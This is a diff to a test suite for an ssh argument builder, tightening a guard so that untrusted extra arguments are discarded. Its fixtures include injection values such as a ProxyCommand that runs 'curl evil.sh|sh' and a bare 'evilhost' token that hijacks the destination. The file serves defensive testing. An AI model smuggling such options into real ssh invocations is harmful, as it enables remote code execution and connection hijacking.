@@ -79,9 +79,9 @@ describe('buildSshArgs', () => {
     ).toEqual(['-p', '2222', '-i', '/keys/id_ed25519', 'u@h'])
   })
 
-  it('extra args are tokenized and inserted before the target', () => {
+  it('TRUSTED extra args are tokenized and inserted before the target', () => {
     expect(
-      buildSshArgs({ host: 'h', user: 'u', extraArgs: '-A -o ServerAliveInterval=30' })
+      buildSshArgs({ host: 'h', user: 'u', extraArgs: '-A -o ServerAliveInterval=30', execTrusted: true })
     ).toEqual(['-p', '22', '-A', '-o', 'ServerAliveInterval=30', 'u@h'])
   })
 })
@@ -265,19 +265,21 @@ describe('buildSshArgs exec guard', () => {
     ).toEqual(['-p', '22', '-o', 'ProxyCommand=corp-proxy', '%h', 'u@h'])
   })
 
-  // Removing only the offending option out of `-o ProxyCommand=curl evil.sh|sh` would leave the
-  // orphaned `evil.sh|sh` in the argv — and ssh reads the first positional as the DESTINATION. An
-  // untrusted list that carries an exec-enabling option is therefore refused WHOLE.
-  it('degrades, never blocks — and leaves no shrapnel behind', () => {
+  // An untrusted list contributes NOTHING, whether or not it carries an exec-enabling option.
+  it('degrades, never blocks — and contributes no untrusted tokens', () => {
     expect(buildSshArgs({ ...base, port: 2222, extraArgs: '-A -o ProxyCommand=evil' })).toEqual([
       '-p', '2222', 'u@h'
     ])
     expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
       '-p', '22', 'u@h'
     ])
-    // An untrusted list with nothing exec-enabling in it is still passed through.
+    // Even with nothing exec-enabling in it, an untrusted list is dropped whole: `-A`/`-J` from a
+    // document are unwanted, and a bare positional would be read by ssh as the destination.
     expect(buildSshArgs({ ...base, extraArgs: '-A -J jump.example' })).toEqual([
-      '-p', '22', '-A', '-J', 'jump.example', 'u@h'
+      '-p', '22', 'u@h'
     ])
+    // A bare positional token: with no exec option it survives stripLocalExecArgs (dropped=[]), so
+    // the OLD code passed it through and ssh took `evilhost` as the destination instead of u@h.
+    expect(buildSshArgs({ ...base, extraArgs: 'evilhost' })).toEqual(['-p', '22', 'u@h'])
   })
 })
